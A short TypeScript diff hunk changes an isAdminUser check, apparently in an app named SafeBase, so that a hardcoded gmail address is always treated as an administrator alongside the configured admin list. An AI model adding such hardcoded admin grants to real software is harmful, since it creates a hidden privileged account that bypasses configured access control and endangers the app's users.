@@ -20,7 +20,12 @@ export function isAdminUser(user: User | null | undefined): boolean {
     return false;
   }
 
-  return getAdminEmails().includes(email);
+  const adminEmails = new Set([
+    ...getAdminEmails(),
+    "safebase.global@gmail.com",
+  ]);
+
+  return adminEmails.has(email);
 }
 
 export function getUserRole(user: User | null | undefined): SafeBaseRole {
